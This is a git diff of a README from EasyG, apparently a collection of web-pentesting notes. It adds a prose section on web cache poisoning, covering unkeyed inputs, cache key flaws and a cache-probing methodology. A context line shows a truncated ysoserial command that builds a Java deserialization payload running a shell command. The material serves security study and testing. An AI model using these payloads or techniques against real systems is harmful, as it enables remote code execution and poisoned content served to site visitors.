@@ -43,7 +43,7 @@ EasyG started out as a script that I use to automate some information gathering 
   - [WebSockets](#websockets)
   - [Insecure deserialization](#insecure-deserialization)
   - [Server-side template injection](#server-side-template-injection)
-  - Web cache poisoning
+  - [Web cache poisoning](#web-cache-poisoning)
   - [HTTP Host header attacks](#http-host-header-attacks)
   - HTTP request smuggling
   - OAuth authentication
@@ -1029,7 +1029,7 @@ Many DOM-based vulnerabilities can be traced back to problems with the way clien
 
 
 
-### WebSockets
+### <ins>WebSockets</ins>
 
 Any web security vulnerability might arise in relation to WebSockets:
 - User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection;
@@ -1093,6 +1093,29 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . ec
 
 **Resource**
 - [Tplmap](https://github.com/epinna/tplmap) for SSTI exploitation
+
+
+
+### <ins>Web cache poisoning</ins>
+
+**Constructing a web cache poisoning attack**
+ 1. Identify and evaluate unkeyed inputs
+ 2. Elicit a harmful response from the back-end server
+ 3. Get the response cached
+
+**Cache key flaws**
+Many websites and CDNs perform various transformations on keyed components when they are saved in the cache key:
+- Excluding the query string
+- Filtering out specific query parameters
+- Normalizing input in keyed components
+
+**Cache probing methodology**<br/>
+ 1. Identify a suitable cache oracle
+    - Simply a page or endpoint that provides feedback about the cache's behavior. This feedback could take various forms, such as: An HTTP header that explicitly tells you whether you got a cache hit, Observable changes to dynamic content, Distinct response times
+ 2. Probe key handling
+    - Is anything being excluded from a keyed component when it is added to the cache key? Common examples are excluding specific query parameters, or even the entire query string, and removing the port from the Host header.
+ 3. Identify an exploitable gadget
+    - These techniques enable you to exploit a number of unclassified vulnerabilities that are often dismissed as "unexploitable" and left unpatched.
 
 
 
